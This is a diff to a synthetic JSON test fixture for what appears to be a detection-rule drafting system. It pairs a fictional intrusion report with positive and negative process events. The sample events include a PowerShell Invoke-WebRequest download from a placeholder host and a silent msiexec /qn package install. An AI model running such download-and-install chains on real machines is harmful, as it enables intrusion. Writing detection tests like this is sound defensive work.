@@ -1,18 +1,18 @@
 {
   "synthetic": true,
   "notice": "All text and events are fictional; URLs are never fetched remotely. No client predicates or analyst annotations are supplied to the draft writer.",
-  "expected_drafts": 11,
-  "expected_checks": 23,
+  "expected_drafts": 12,
+  "expected_checks": 26,
   "reports": [
     {
       "name": "rmm",
       "sections": [
         {
           "tag": "p",
-          "text": "RMM.Agent.exe launched PowerShell with Invoke-WebRequest, then executed msiexec.exe with /qn to install the package."
+          "text": "The attacker used RMM.Agent.exe to launch PowerShell. The PowerShell process changed session settings and executed Invoke-WebRequest to download ClientSetup.msi. The downloaded package was installed silently through msiexec.exe with the /qn switch."
         }
       ],
-      "expected_drafts": 1,
+      "expected_drafts": 2,
       "checks": [
         {
           "name": "rmm positive",
@@ -22,7 +22,8 @@
             "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
             "CommandLine": "powershell Invoke-WebRequest https://example.test/package"
           },
-          "expected_match": true
+          "expected_match": true,
+          "stage_image": "PowerShell"
         },
         {
           "name": "rmm negative",
@@ -31,6 +32,37 @@
             "ParentImage": "explorer.exe",
             "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
             "CommandLine": "powershell Invoke-WebRequest https://example.test/package"
+          },
+          "expected_match": false,
+          "stage_image": "PowerShell"
+        },
+        {
+          "name": "msi positive",
+          "stage_image": "msiexec.exe",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec /i ClientSetup.msi /qn"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "msi other package negative",
+          "stage_image": "msiexec.exe",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "msiexec.exe",
+            "CommandLine": "msiexec /i OtherPackage.msi /qn"
+          },
+          "expected_match": false
+        },
+        {
+          "name": "msi interactive negative",
+          "stage_image": "msiexec.exe",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "msiexec.exe",
+            "CommandLine": "msiexec /i ClientSetup.msi /qf"
           },
           "expected_match": false
         }
